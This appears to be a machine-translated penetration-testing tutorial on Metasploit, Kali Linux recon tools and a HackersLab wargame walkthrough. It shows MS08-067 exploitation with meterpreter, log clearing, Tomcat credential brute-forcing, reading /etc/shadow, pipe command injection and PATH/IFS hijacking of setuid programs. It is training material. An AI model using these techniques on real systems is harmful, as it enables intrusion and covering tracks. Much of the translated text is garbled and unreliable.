
B operation to SICO

We will use the Msfconsole environment since it is the most complete and most used we can see the options of this by typing in the console the help command.

If we use the Metasploit database, we can find in the menu Applications Kali

Kali Linux >> Applications >> System Services >> Community >> Metasploit Pro Start

At the beginning we should collect information from the objective system, this first stage is usually called the recognition stage, with which we will obtain the necessary data to make the appropriate decisions based on what we have found.

Since we have already studied tools that are more suitable for this purpose (nmap), we will use this program to find the hosts, their operating system and their services. We can do it directly from Metasploit, using the db_nmap command, which has an operation similar to that of nmap (uses the same parameters). Once the IP addresses, services, ports, etc. are obtained, we can decide where we want to attack.

If we want to see the exploits available in our Metasploit we will proceed to write the option show exploits. We will be shown a list with all the exploits that we can use, hence the importance of having updated our Metasploit Framework, since with each update there is usually an increase in the number of exploits that you can use.

We are shown a list of exploits as well as a brief description, a ranking and the operating systems it attacks.

msf> show exploits

Exploits

========

Yam

Disclosure Date

Rank

Description

It is also possible to search the exploit using the search command. This command also serves to find other resources. Once we have chosen the exploit we want to use, we will write the command – use [exploit] to indicate Metasploit the exploit to activate.

As an example, we will use the exploit ms08_067_netapi, so we search through the list of exploits (using the search command) and find that its full name is windows / smb /ms08_067_netapi.

So we would type the following command: use windows / smb / ms08_067_netapi

If everything goes well (we have written the name of the exploit correctly) metasploit will show on the console the exploit you are using in red, indicating that you have managed to load it.

Once this is done, we will proceed to use a payload to take advantage of the exploit. To see a list of payloads compatible with our exploit, we will use the show payloads operation.

msf exploit ( ms08_067_netapi )> show payloads

As we can see, metasploit tells us that you are ready to use the payload. If we introduce show options below we will be shown the options that we can use:

msf exploit ( ms08_067_netapi )> show options

Automatic Targeting

We see that in this case, all the options are necessary (all have the Required = yes field) as well as most of them already have a default value, although we can adjust them to our convenience with the command set [option] [parameters] as we will see next.

We indicate the IP of the target machine, as well as ours, by means of the orders set RHOST [ target ip ] and set LHOST [our IP], as we have seen in the table of options above.

After putting the corresponding IPs, we will use the meterpreter to take advantage of the vulnerability. Once initialized meterpreter we can fully exploit the vulnerability.

How does it work?

Metasploit Framework has a modular architecture (which we can see in more detail below) this means that each exploit is integrated into the framework so that it can interact with it (and consequently with other modules such as payloads) simply by means of load and configuration commands.

Options

Here is a list of some of the options available in msfconsole, we can see more specific information on each option using the -h parameter

• Back: Download the current module

As we see in the example, the system is not vulnerable to this particular exploit; this is the main objective to achieve when we update our systems, having the least amount of vulnerabilities possible.

• Connect: Small netcat 1 that allows SSL 2, file sending, proxies, etc.        

• Edit: allows you to edit (by default with Vim 3 ) the loaded module        

• Help: show the commands (as we have seen in the basic example)

> (1)  Netcat: Tool for analysis network, especially for the TCP / IP protocol but also é n you can work with UDP. It contains a lot of features and is one of the Diagnostic tools and safety best valued by network administrators.

> (2)  (2) SSL (Secure Sockets Layer): Protocol providing secure communications over a network

> (3)  Vim or Visual Improved is a text editor present on all Linux systems

• Info: shows a large amount of information of the loaded module (options, objectives, author, license, references, restrictions, etc)        

• Irb: shows a Ruby interpreter that allows the creation of scripts        

• Jobs: shows the modules that run in the background        

• Load: load a plugin        

• Unload: remove the plugin        

• Route: allows you to create sockets        

• Search: search (of modules, descriptions, references, etc)        

• Sessions: allows you to list, interact and end sessions (both shells, meterpreter, VNC, etc.)        

• Set: set options (as we have already seen)        

• Setg: configure common options in modules (such as LHOST or RHOST) saving time if we are going to use several. If we also use the save option we will save it for other sessions too        

• Show: shows the modules/options/ etc of metasploit (as we have seen before)        

• Use: load the module (as we have already seen)

Meterpreter

We will try to exploit the vulnerability using Meterpreter.

Once we have activated the exploit and the payload the prompt will pass from the msfconsole msf to indicate meterpreter. We will write the ps command to see the active processes on the target machine –

meterpreter> ps

This has been a simple example of what Metasploit is capable of doing. However, this Framework is very extensive and has many capabilities, including creating our own exploits and payloads, saving our attacks in a database, HIDING or n and codification or n of exploits...

Meterpreter Options

List of meterpreter options

• Help: show meterpreter options        

• Background: send the current meterpreter session to the background (returns the start of metasploit with the msf> prompt)        

• Cat: shows the contents of a file (such as Linux cat)        

• Cd: change the directory (like the cd of MsDos and Linux)        

• Pwd: shows the current directory        

• Clearev: clean the application, system and security logs of a Windows OS        

• Download: download a target file (double \\ required when acting against Windows)        

• Edit: open a file (with Vim) in the target        

• Execute: execute a command on the target        

• Getuid: shows the user that Meterpreter is using        

• Idletime: shows how long the target machine has been committed        

• Ipconfig: as the same option in Windows, it tells us the network configuration of the target        

• Ls: as in Linux, it shows us the files of the current directory          

• Migrate: we change to another process (as we have seen before)        

• Ps: gives us a list of active processes (as we have seen before)        

• Resource: execute meterpreter commands that are written in a text file

As we can see we have listed the current directory (Desktop) showing us the files as well as their permissions, size, type, date of last modification and their name (the directories. And.. Are the current directory and their father respectively).

After showing us the files it has gone to the background, as we had indicated.

This command performs a file search; note that in a Windows system we have to put the double bar (\\).

• Shell: open a terminal on the target (as we have seen before)        

In this case, we have uploaded a harmless text file, but a malicious program such as a virus or Trojan could also be sent.

(A Trojan is a program capable of creating a backdoor on a computer to give us remote access. It's called that because it behaves like the Trojan horse of Homer's Odyssey)

Ż C or how it works Meterpreter?

Meterpreter is a payload that works alongside the exploit used without creating a new process, which makes it more effective (and stealthy). To do this, use DLL injection 1 stagers 2.

Its operation is as follows:

Target Attacker            

(Meterpreter)

First, the exploit and the first stage 3 are sent to the target.

After achieving exploitation, the stager joins the target in a task and tries to communicate again with the mfsconsole to open communication.

Once the connection is established, the second stage is sent. If you manage to perform the DLL injection correctly, metasploit sends the DLL meterpreter to establish a complete and stable communication channel.

Finally, meterpreter loads the necessary extensions (such as stdapi or priv) using the TLV 4 protocol

> (1)  In the Windows OS processes often load link libraries din to mico (dynamiclink Library). DLLs are files that perform functions that are common to many programs, so using it is intended to promote the modularity of c or I say, as í as better use of system resources (especially memory).

The DLL injection is a technique that lets you enter c or I say in other processes, this will force a running process to load a DLL with C or I say maliciously. This way is more to help security programs to detect it since it is to "hidden” in a regular process

> (2)  Stager: establishing a connection payload or n between attacker v í victim. It tries to be as m to s small ñ os and reliable as possible so they end up using several small ñ or size ñ or (metasploit choose them to s appropriate in each case).

> (3)  (3) Stage: component / m or module of Stager

> (4)  (4) Protocol TLV (Type Length Value) is a format that can represent information or n very efficiently. To do these three fields are used: the type of data (b to basically one tag) length (field value) and the value (in our data s t).

Additional goals of Meterpreter:

Stealth        

• Meterpreter resides only in memory (leaves no trace on disk)        

• A new process is not created (it is injected into an already active one)        

• Communication between our machine and the target is encrypted        

Strength    

• Meterpreter uses a communication channel        

• The TLV protocol has few limitations        

Extensible

You can add extensions easily and without rebuilding/recompiling it        

• Rex: The basic library for most tasks (Basic tasks, plugin management, protocols, etc.)        

• MsfCore: Provides the “basic” API, defines the Metasploit framework        

• MsfBase: Provides the “friendly” API and with which it will interact (usually through an interface), simplified for use in the framework         

Modules

• Auxiliary module allows the interaction of external tools such as vulnerability scanners, sniffers, etc ... with the Metasploit framework.        

• Encoders module: Provides algorithms to encode and obfuscate (try to make unintelligible) the payloads that we will use after the exploit has been successful.        

• Exploits module: This is where all the exploits available in the framework are located to gain access to the different Operating Systems.        

• Payloads module: It offers a large number of codes that we can execute remotely once the exploit has been successful.        

• Post module: Provides functionalities for the post-exploitation phase.        

• Nops module: It ensures that the connection and data traffic of the payloads is kept constant        

> Chapter 5 - Introduction to Kali Linux

Kali Linux is the new generation of the well-known Linux BackTrack distribution, which is used to perform Security Audits and Penetration Tests. Kali Linux is a platform based on GNU / Linux Debian and is a complete reconstruction of BackTrack, which contains a large number of tools to capture information, identify vulnerabilities, exploit them, escalate privileges and cover fingerprints.

This chapter provides an excellent practical guide for using the most popular tools included in Kali Linux, which cover the basics of Penetration Testing. This document is also an excellent source of knowledge for professionals immersed in the subject, as well as for beginners.

Kali Linux Features

Kali Linux is a complete reconstruction of BackTrack Linux and fully adheres to Debian development standards. A whole new infrastructure has been put into operation, all tools have been checked and packaged, and Git is now used for the VCS.

• More than 300 Penetration Testing tools        

• It is free and always will be        

• Open Source Git Tree        

• FHS compliant (Filesystem Hierarchy Standart)        

• Extensive support for wireless devices        

• Kernel patches for injection.        

• Safe development environment        

• Packages and repositories signed with GPG        

• Various languages        

• Fully customizable        

• ARMEL and ARMHF support

Get Kali Linux

Kali Linux can be downloaded for different architectures, such as i386, amd64 and armel, armhf. For i484, i686 and amd64 it can be downloaded either in the form of an ISO image or in a virtual machine for VMWare. It can also be downloaded by direct download or through Torrent.

> Chapter 6 - Kali Linux Installation

Kali Linux can be installed on a hard disk like any GNU / Linux distribution, it can also be installed and configured to perform a dual boot with a Windows Operating System, in the same way, it can be installed on a USB drive, or installed on an encrypted disk

It is suggested to review the detailed information on the various installation options for Kali Linux, on the following page: [http://docs.kali.org/category/installation](http://docs.kali.org/category/installation)

Change Root Password

For a good security practice, it is recommended to change the default password assigned to the root user. This will make it difficult for malicious users to access the system with this default password.

# passwd root

Enter new UNIX password:

Retype new UNIX password:

[*] The password will not be displayed as long as it is written and must be entered twice.

Starting Network Services

Kali Linux network services are, HTTP, Mestaploit, MySQL, OpenVAS, and SSH.

If the HTTP service is required to start, the following command must be executed:

# /etc/init.d/apache2 start

These services can also be started and stopped from the menu:

Applications -> Kali Linux -> System Services.

Kali Linux provides official documentation on several of its aspects and features. The documentation is in constant work and progress. This documentation can be located on the following page: [http://docs.kali.org/](http://docs.kali.org/)

Kali Linux Tools

Kali Linux contains a large number of tools obtained from different sources related to the field of security and forensics.

A list of all these tools and a quick reference for them are provided on the following website: http://tools.kali.org/

Shell Scripting

The Shell Bash allows you to automate an action or perform repetitive tasks that consume a great deal of time. For the following practice, a website that publishes lists of proxies will be used.

Using commands from the bash shell, the IP addresses and Ports of the Proxies will be extracted to a file.

# wget http://www.us-proxy.org/  

# grep "<tr> <td>" index.html | cut -d ">" -f 3,5 | cut -d "<" -f 1,2 | sed 's / <\ / td> /: / g'    

Capture Information

This phase attempts to collect as much information as possible about the objective, such as possible usernames, IP addresses, name servers, and other relevant information. During this phase, each piece of information obtained is important and should not be underestimated. Bear in mind that the collection of a greater amount of information will generate a greater probability for a satisfactory attack.

The process where information is captured can be divided in two ways - the capture of active information and the capture of passive information. In the first way, information is collected by sending traffic to the target network, such as performing ICMP ping, and TCP / UDP port scans. For the second case, information is obtained on the target network using third-party services or sources, such as Google, Bing, or social networks.

Public Sources

There are various public resources on the Internet that can be used to collect information about the objective. The advantage of using this type of resource is the non-generation of direct traffic towards the objective, in this way the probability of being detected is minimized.

Capture Documents

The "-dnsserver" option defines the use of a particular DNS server for hostname queries.

The "-dns" option defines the domain to scan.

The "-wordlist" option defines a list of words to use to discover subdomains.

The "-file" option defines an output file.

[*] The dnsenum tool includes a list of words “dns.txt”, which can be used with any other tool that requires it, as is the case here.

Dmitry

DMitry is an online command program for Linux, which allows you to capture as much information as possible about a host, from a simple Whois to reports of operating time or port scanning.

# dmitry  

# dmitry -w -e -n -s [Domain] -o /tmp/resultado_dmitry.txt   

The "-w" option allows a whois query to the IP address of a host.

The "-e" option allows you to search for all possible email addresses.

The "-n" option attempts to obtain information from a netcraft about a hot.

The "-s" option allows you to search for possible subdomains.

The "-o" option allows you to define a file name in which to save the result.

Although there is an option in dmitry that would allow obtaining information about the host's domain from Netcraft, it is not feasible to obtain it. This information can be obtained directly from the Netcraft website:

[http://searchdns.netcraft.com](http://searchdns.netcraft.com)

Route Information

Traceroute

http://linux.die.net/man/8/traceroute

Traceroute tracks the route taken by packets from an IP network on its way to a specified host. This uses the "TTL" field of the IP protocol and attempts to elicit an ICMP response TIME_EXCEEDED from each gateway through the route to the host.

The traceroute version on GNU / Linux systems uses UDP packets by default.

# traceroute --help

# traceroute [IP Address]

Tcptraceroute

http://linux.die.net/man/1/tcptraceroute

tcptraceroute uses TCP packets to trace the route to the target host.

# tcptraceroute --help  

# tcptraceroute [IP Address]  

Use Search Engines

Theharvester

https://code.google.com/p/theharvester/

# nping -h  

# nping [IP Address]  

Nping uses the ICMP protocol by default. In case the target host is blocking this protocol, the TCP test mode can be used.

# nping --tcp [IP Address]

The "--tcp" option is the mode that allows the user to create and send any type of TCP packet. These packets are sent embedded in IP packets that can also be tuned

Recognition of the Operating System

This procedure tries to determine the operating system working on the active objectives, to know the type and version of the operating system to try to penetrate.

nmap

http://nmap.org/

# nmap -O [IP Address]

List of Services

The determination of the services in operation at each specific port can ensure a satisfactory penetration test on the target network. You can also eliminate any doubt generated during the recognition process on the operating system footprint.

Nmap

http://nmap.org/

# nmap -sV [IP Address]

The “-sV” option of nmap enables version detection. After discovering the TCP and UDP ports using some of the scans provided by nmap, version detection interrogates those ports to determine more about what is currently in operation.

The database contains tests to consult various services and expressions of correspondence to recognize and interpret the responses. Nmap tries to determine the service protocol, application name, version number, hostname and device type.

Exploit the Objective

After having discovered the vulnerabilities in the hosts or target network, it is time to try to exploit them. The exploitation phase sometimes ends the Penetration Test process, but this depends on the contract because there are situations where you must enter deeper into the target network, with the purpose of expanding the attack throughout the network and winning All possible privileges.

Repositories with Exploits

Various types of vulnerabilities are reported every day, but currently, only a small part of them are exposed or published for free. Some of these "exploits" can be downloaded from websites where repositories are maintained.

The Metasploit Framework Console

http://www.metasploit.com/

The Metasploit Console (msfconsole) is mainly used to manage the Metasploit database, manage the sessions, as well as configure and execute the Metasploit modules. Its essential purpose is exploitation. This tool allows you to connect to the target so that the exploits can be executed against it.

Since the Metasploit Framework uses PostgreSQL as its database, it must be started in the first instance, and then start the Metasploit Framework console.

# service postgresql start

To verify that the service has started correctly, the following command must be executed.

# netstat -tna | grep 5432

To display the Metasploit Framework help.

# msfconsole -h  

# msfconsole  

Some of the useful commands to interact with the console are:

msf> help

msf> search [Module Name]

msf> use [Module Name]

msf> set [Option Name] [Module Name]

msf> exploit

msf> run

msf> exit

The following example details the use of the auxiliary module “SMB User Enumeration (SAM EnumUsers)”.

CLI of the Metasploit Framework

Metasploit CLI (msfcli) is one of the interfaces that allow the Metasploit Framework to perform its tasks. This is a good interface to learn how to manage Metasploit Framework, or to evaluate/write a new exploit. It is also useful in case it is required to use it in scripts and apply automation for tasks.

# msfcli -h  

# msfcli  

# msfcli [Exploit Route] [Option = Value]

The following example will use the auxiliary module called “MySQL Server Version Enumeration” which allows enumerating the version of MySQL servers.

For the following example, the auxiliary module named “Tomcat Application Manager Login Utility” will be used in the Metasploit Framework, which will simply attempt to authenticate to the Tomcat Application Manager instance using specific users and passwords.”

msf> search tomcat

msf> use auxiliary / scanner / http / tomcat_mgr_login msf auxiliary (tomcat_mgr_login)> show options

msf auxiliary (tomcat_mgr_login)> set RHOSTS [Objective IP] msf auxiliary (tomcat_mgr_login)> set RPORT 8180

msf auxiliary (tomcat_mgr_login)> set USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt

msf auxiliary (tomcat_mgr_login)> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

msf auxiliary (tomcat_mgr_login)> exploit msf auxiliary (tomcat_mgr_login)> back

Using common usernames

Exploitation Demonstration & Post Exploitation

The demonstrations presented below allow strengthening the use of some tools presented during the Course. These demonstrations focus on the Exploitation and Post-Exploitation phase, that is, the processes that an attacker would perform after gaining access to the system by exploiting a vulnerability.

Demonstration using a local exploit to escalate privileges.

# ssh -l msfadmin 192.168.159.129

Once inside the system we proceed to use the "sudo" command.

# sudo cat / etc / shadow  

# sudo passwd root

Enter a new password and then

# your root  

# id  

The Post Exploitation phase would be similar to the one detailed in the first example.

> Chapter 7 – Solving Level Problems

Level 0 Problem

Login: level08 Password: guest Study: Introduction Level 0

Since it is extremely simple, it is just meant to make you understand some of the concepts you will need to move on to the next levels. I will take this space to explain. Our main objective at level0, as in all others, is to get the password to the next level. This can be done by running the vo pass, which is in the bin directory. Try connecting to HackersLab and typing pass. A screen appears that will wax and show you the level0 password. So to get the password for thelevel1, do I have to login as this user? How is this possible?

There is another way. At every level, there is a file that has the UID (user identification number) higher than yours and the GID (Identical group identification number). The task is: how to explore this file so that through it you can execute the pass command and get the next password? Now if we do this through it and it has a higher user privilege (UID), our system will “think” that we are the other user. Difficult? Let's see an example.

Suppose we connect to HackersLab. Let's create one imaginary level0, just as a test: 8 Login: level08 Password: [level0 @ level0] $ whoamilevel0 [level0 @ level0] $ idUID = 2000 GID = 2000 OTHER ANY = 9999 So far, what have we achieved? We have successfully logged in to level0, we have entered the whoami command, which informed us that the username is level0, and the id command, which provided us with user IDs (UID), group IDs (GID), and other things that will not be needed for us.

Now I will have the system search for files that have a UIDsuperior to ours. For example, if our UID is 2000, then I want to search for files that have UID 2001 (level1). [level0 @ level0] $ find / -uid 2001 –gid 2000/ tmp / suzuki: Permission Denied/ bin / joy: Permission Denied/ etc / test/ usr / local / yu: Permission Denied/ var / shenmue: Permission Denied.

I asked the system to show me all the files that they allowed and are user level1 (which has UID 2001) and group level0 (from GID 2000). Why look for the GID? Simple. The file needs to be from our group so that we can manipulate it. This will become clearer in a moment. We only found the / etc / test file. Everything else with Permission Denied is rubbish.

How to list, then, only the files we want? [level0 @ level0] $ find / -uid 2001 –gid 2000 2> / dev / null/ etc / test Redoing the command, I included the string 2> / dev / null , which I told the system“ anything not necessary ( 2 ) send to ( > ) the trash ( / dev / null )”. Thus, we only got the result we expected. So, let's list the in-file formations. [level0 @ level0] $ ls –la / etc / test-rwx — x— 1 level1 level0 10876 Mar 8 06:24 test.

From the information, we confirmed what we wanted. It is a file created by user level1 and that belongs to group level0\. The user who created it has the permission of total users, group users are allowed to execute only, and others not even that. Just out of curiosity, I could browse the file using the username instead of UID? Of course!

Perfect. We found the file the same way. How can we just run the file, let's try: [level0 @ level0] $ cd / etc[level0 @ level0 etc] $ testError: file not found. An error has occurred. This is because our executable file is not in PATH. OPATH is a variable that indicates which directories are the files that can be run from the directory you are in. We can then only co-place “./” (dot and slash) in front of the executable. necessarily will run it without relying on PATH. [level0 @ level0 etc] $ ./ test/ bin / pass. Congratulations ... the password for level1 is xxxxx. Ready! In our imaginary example, the test file ran the pass (that command that gives us the password, remember?). But it gave us the password of level1 instead of 0? This was because the test had user permission from level1, so we fooled the pass command and it gave us the prize. At every level, this must be done differently. If you have not understood this, we will answer your questions now, in the practical part step by step and then, we'll connect to drill.hackerslab.org via telnet:8 Login: level08 Password: guest Connecting to level0.

We entered. I typed the whoami and id commands to see the username and identification numbers (IDs). It doesn't have to be done; I just did it for your ease of understanding. We are ready to search for our target file. I typed find / -user level1 –group level0 2> / dev / null to look for files created by level1 and having level0 as a group. The system found some files, including /dev/.hi. Dev means devices. Following the level hint, I will try this file first. I listed the information and saw that it has executed permissions for users of the level0 group. So let's run it and see what happens. I typed cd / dev to access the directory where the target file is. I typed, so.hi . The system returned an error saying that the command was not found. This means that the command is not in the PATH. No problem ...we hit a "./" in front of the command and execute it: ./.hi . Apparently,nothing happened.

Let's check: Let's try the id command. Oh! A surprise! A new ID has appeared with EUID number 2001 (level1). This EUID didn't exist before ... it was given to us by the program. We will then try the whoami command, just to take the doubts. That!! The command informed us that we are level1 (or at least that we have permission from level1). How could .hi do this? Simple, he was a backdoor.funds or trojan horse). The moment we ran it, he ran the/ bin / sh command and created another shell (command session) within the first one, but with your permissions. This means that if we try to type thepass command (which returns the level password), now we get ...The password for the next level !!! The password for level1, then, is the newworld.

Level 1 Problem

Login: level18 Password: newworld Study: External Execution of Commands and Pipes.

The necessary knowledge to have at this level is to know how to take advantage of a program that executes external commands. If the program has an EUID (ID) higher than yours, this can be a serious issue. For a demonstration, let's follow the example of level0\. I will create an imaginary level1, with dummy files, as a test. Login: level18 Password: [level1 @ level1] $ find / -user level2 -group level1 2> /dev / null/ usr / bin / list[level1 @ level1] $ cd / usr / bin[level1 @ level1 bin] $ ./ listEnter a file: / usr / bin / list-rwx — x— level2 level1 876 Jun 23 13:12 / usr / bin / list.

Let's take a slow look at what we did. We are supposed to log in to the HackersLab system, we look for the file (s) that have level2 UID and Level1 GID (if you still don't understand why the search is done this way, re-read level0). We found the file / usr / bin / list .I tried to run it and got it. He asked me for any file and informed me the same as we were using, just to see what would happen (could be any other). The list program then returned me information about the file I provided. The problem is there. The list executed from within it the command is -lato show file information. He performed the following on the system: [level1 @ level1] $ ls -la / usr / bin / list-rwx — x— level2 level1 876 Jun 23 13:12 / usr / bin / list But he executes with privileges superior to ours (forgot that your creative user and IDs are level2???). So what can we do to add another command since it executes ls externally? The easier way is using the pipe ( | ), which we saw in the command section. He will allow you to enter another command to be executed. But where will we do it? Let's run the list again: level1 @ level1 bin] $ ./ list. Enter a file: / usr / bin / list Here is the secret. Instead of just putting the PATH of the file, how about we add the pipe and some command in front? Would be like this: Enter a file: / usr / bin / list | pass That! If our theory is right, it will run ls, listing ourprogram / usr / bin / list and then immediately run the program in the for-provides the passwords. Complete now: level1 @ level1 bin] $ ./ list. Enter a file: / usr / bin / list | pass-rwx — x— level2 level1 876 Jun 23 13:12 / usr / bin / list The password for level2 is ...Ready! We get a new password. Let's get to the real walkthrough now.

Step by step Log in to HackersLab and log in with the level1 password. The first thing to do (already classic) is type the command find / -userlevel2 -group level1 2> / dev / null to find our target file. We found two, / proc / 20840 and / usr / bin / amos . But wait a minute ... Amos is the name of a prophet (dim, dim, dim ... we found why this tip level). Let's check the amos file, then: Seeing the information from the masters, we find that again we have group permission to execute it (x). We managed to rotate it without needing “ ./ ” (slash) before it means that it is in the PATH. How did it happen in our study session simulation? The program asks us the PATH of any file. We put the file we are currently running (such as said before, can be anyone). He informed us that it is executable.

Getting back to the problem at this level, we saw that Matthew had to use the file command to make the amos program. So, is the program running externally file archives? You? Let's try it out! Yes!! The sample runs the file externally. Let's try to run it and make a pipe to try to get your privilege. So let's do it the same way we study: we put the information for / usr / bin / amos, the | ( pipe ) and the pass command. Thus, the program will have the file / usr /bin / mas | pass. Result? The password for level2\. One more stage won.

Level 2 Problem

Kevin, a BBS programmer, wants to add an alert on your homepage so your members can see your posts every time they log in. Unfortunately, the message has more than one page and its members cannot read it. As a result, he has been warming his brain night and day, trying to find a solution. Finally, he considered using the more command to solve your problem. However, this method is risky because of security issues. TIP: Nuff said!

Login: level28 Password: DoItYourself Study: Shells and Subshells

The shell of a system is nothing but the execution of a shell interpreter commands entered. It is a text-mode screen in which you can interact through system commands. In the DOS system, for example, the command interpreter is the command.com file. At the Windows NT and compatible, it is cmd.exe. You can prove it on NT by going to Start / Run and typing cmd. A command screen will open.

Why use Windows as an example? Why is Linux not a close different. It has several shell types (sh, csh, ksh, bash2 ...) which, when being run within a graphical window manager (such as GNOME or KDE), give you another small text-mode window, the command prompt bosses. To finish it, it's simple. Just close it. When you run the shell from within a window manager, you will be running in the background. This is an important concept to learn because we will use it much later. I can also run a shell inside another one. This is called a subshell. An example is shown below: [my system] $ ls....rhostspasswd.old[my system] $ / bin / shbash $.

In the example above, I was in a shell (where I was showing my spelled system) and moved on to another, sh (or simple bash). If I type the exit command, I go back to the previous one. This proves that sh is a subshell because was within what was originally run. bash $ exit[my system] $ This can also be done through programs. Many programs of text mode that run on shells (such as pine, vi and others) allow you to run a subshell from inside them. Even commands like more also allow. This will be clear in the practical part of this level. Step by step We connect to HackersLab and try to list the file with permission of user level3 and group level2.

We found the alert file. Probably the same as created earlier from the description of this level created. Next step: List it. Execute it. Let's do it. We ran the alert file and saw that Kevin used the more command to pause between the screens of your file. If we hit Enter, Page Down and some other keys, the file will keep being shown slowly. Instead, we will do the following: We wrote the command ! / bin / sh over —More—. This means telling the system: My dear Linux, run ( ! ) for the command interpreter sh that is inside the bin directory ( / bin / sh ). We fell into the shell. Like who is running the shell is a program that has level3 permissions, we tested with whoami and are level3 ready. Running the pass, and so, there we go to level3!

Level 3 Problem

Login: level38 Password: hackerproof Study: PATH and IFS HackersLab

Levels 3 and 4 are pretty much the same, in the two; you will need to understand the concept of PATH, IFS, and export. These levels at the beginning of the challenge are really interesting and difficult ones (you will see later level5 and 6 are much easier). Although the book focuses on how to break a Linux system, I will explain the PATH in brief. Learning this term makes it easier to understand others. First, let's go to the concept:

PATH is the absolute path of directories, where the system always looks for a file to run. For example, typing in the root of a system the commands ls, dir, date or any other, the OS will search directoriesPATH by these commands and execute them. If not, it will return an error. Complicated? Not so much.

Let's look at a simple example. In the above DOS example, I listed the data that was in the directory called test director. I found that there was a program called app.exe. I then tried to run the app from the root. I received an error saying that the command is not recognized (not found). So, I modified the PATH and pointed it to the test director where was the app. Just use PATH = C: \ directoriotest. I tried to run the app again and voila! It rolled right. Of course, now the command was inside the system search PATH. Okay, but how does this relate to a hacking challenge? All. Imagine that a Windows application externally calls the send NET.EXE (the command that controls the NetBIOS protocol, and may be connected to shares, sends messages, enables users, etc.). What would happen to this program if I had created another with the same name ( NET.EXE ), put it in the test director and set the PATH? NET would be run normally by the individual program, but my NET, which could be an intrusion program like a backdoor (or horsebackTrojan).

Going back to Linux, then imagine that Steven's program simply writes the date. That's easy, just create a fake version in a directory (whichever one you want to choose), move the PATH there and export it (send it back to the system).

But we have a problem ... What if his program runs directly / bin / date instead of just date? Even if we modified PATH, the program would be running directly in the directory ... Now what? Who can help us? The fearless IFS. The IFS or Internal Field Separator has an interesting feature – you can give it an ASCII character and whenever a command is typed in the system, this character will be separated. This process has some very interesting uses: In our problem, the Steven program runs directly / bin / date on the system. If we configure IFS as follows: export IFS = / (configuring and exporting to the system in only one line, saves time) What will this entail? Instead of the program running /bin/date, it will run bin date (as two separate commands) because IFS has removed the slash. Well, if it will run date, it will fall on our nasty PATH and we'll be able to break the system ...If you still have questions, they will be taken now in the practical part.

Repeating the (already starting to get boring) process of connecting to HackersLabas level3 and look for the file made by steven, we found the file today (which is curiously in the / usr / man / en / man8 / directory which is the Brazilian Portuguese version of the manual that comes with Linux). We listed the file (only usual) and we saw that it has permission to execute.

Enter the file directory and type the pwd command just to confirm (to show the current directory). Try rotating the file by typing ./today, this way, it returns me the date. Everything is now following what was specified in the initial problem.

Enter the date command as a test and it returns the results in the common format. This is not necessary to be done, it is just curiosity. Entering the set command (shows, changes, and creates system variables, we saw the PATH. The executable file date, which is used externally, is inside the bin directory. Let us then take the necessary steps – those explained in the study.

First, I entered the command export PATH = / home / level3 / tmp. Already, I put export in front to create the new PATH and export it (send it) to the system. This directory / home / level3 / tmp is the only directory that the level3 has permission to record. This is where we will create our fake date. We create and we also export IFS by typing export IFS =/.

A little attention now, the echo / bin / pass> / home / commandlevel3 / tmp / date does nothing more than create a text file named date in our record directory and send this file (echo) the text / bin /pass. This will make every time our date runs, the/ bin / pass command is run, thus showing us the password. Did it work then? At the end of the previous image, we typed again mind ./today to test. It's result time….already? This is our level4 password. Smile!

Level 4 Problem

Login: level4 Password: AreUReady? Study: More Deduction and More PATH.

Level 4 is very similar to the third. Everything I showed in that level study in the past applies here. But there is a big difference. How did I know that? According to the problem, Kevin added just one line of code in your game. This line of code could be anything ... a message on the screen, a comment, or an external command being executed. There is only one way you know: running the game and trying to identify some command it is running (Does it list directories? Show date? Time?). There are commands like strace and others you can use to try to figure out external references. But the easiest way is by trying to run the game and find out. The big difference I was referring to is this: at level3, you knew which should impersonate the date command, but at this level, besides you knowing which command is used, you are not sure if this is the right procedure. Only by analyzing it will you know. Let's go to step by step and check how the procedure should be.

We connect to HackersLab as level4 and look for files with a per-level5 user mission. We found our game, the trojan file, which is inside the / usr / games directory. Let's run it to see what happens. The game prompts you to select the speed with which you want to play. That game is a kind of Tetris. An interesting thing that we saw here is that the game cleared the screen when it started. And it also cleans the screen many times while you play. Is it then the clear command, which clears the screen, running externally? Let's follow this deduction and try to proceed as at level3.

Again, we export PATH to the / home / level4 / tmp directory (the only one we can record). We also exported IFS to the system. We have a file called clear inside our recording directory and we use the / bin / pass command inside it. If that's right then, when we run trojka, it would have the same effect as the past level, but now with the program executed, we have cleared the bad one. So..Silent night, holy night! And onwards to level5 !

Level 5 Problem

Login: level5 Password: Silent night, holy night! Study: Strings in Binaries.

First, what is a string? It's a char grouping, as taught in college. In common language, it is a word, a sentence or a text. Whenever we program, we need to use strings to communicate with each other and with the user. Two examples in different languages of strings for the user. Pascal writeln ('Enter a number'); 8 C ++ cout >> "Enter a number \ n"; Strings are also used to make simple comparisons of words and phrases.

I know all programmers are tired of seeing this, but a basic explanation is important for non-programmers not to get so lost. A comparison example: Test Program; varx : string; beginwriteln (' Enter your password: '); readln ( x ); if x = ' binladen ' then beginwriteln (' Correct Password '); endelse beginwriteln (' Incorrect password '); end; end;

In this little program in Pascal, I first send the user a text requesting your password. I read the variable that contains the password and then the comparison: if the string (password) is the same as binladen, I write in that the password is correct, otherwise, type Incorrect password. This is nothing new to anyone. Here, what is interesting to us will be the compiled program and not the source. When we do not use an encryption feature or executables in our compiled program, it leaves most of our strings on display. You can see this using a hexadecimal edit. But there is an easier way, the strings command, which scans any binary file (not just executables) and shows you the strings found. I will compile the code shown earlier in DOS and show the problem step by step. I did the program and tested it.

I typed saddamhussein as a password. It returned incorrect password, so I tested with the default password, binladen. The program returned the correct password. Soon after, I'll type the strings command progteste.exe to try and find the string binladen.

Oops ... Quickly, looking at the result generated by the strings command, we found four interesting lines: Type your password: bin Laden. Correct password and so we can figure out simple passwords without using neither the encryption features nor some compression on any executable. We saw it in DOS, but what about Linux? So, let's go step by step.

We connect to HackersLab as level5\. We are looking for the target file, the new modified backdoor location cited in the problem. We found / lib / security /pam_auth.so (file pam_auth.so within the directory / lib / security). I listed your information and again we are allowed to execute. Let's do it then.

We ran pam_auth.so and he asked for the password, we put any string of words and it returned Password incorrect. Let's first check your directory for more interesting files. There are many files. We would waste a lot of time trying the command strings in each and every one. So, we will try the main one, pam_auth.so. Will we find something interesting? We found several possible passwords: abcd1234, loveyou!, flr1234 and we will have to try all of these ones by one as a level6 password. There are also two phrases that could be passwords: what the hell are you thinking? And Best of The Best Hackerslab. Hmmm, this Best of TheBest Hackerslab is very suspicious. Let's try it first.

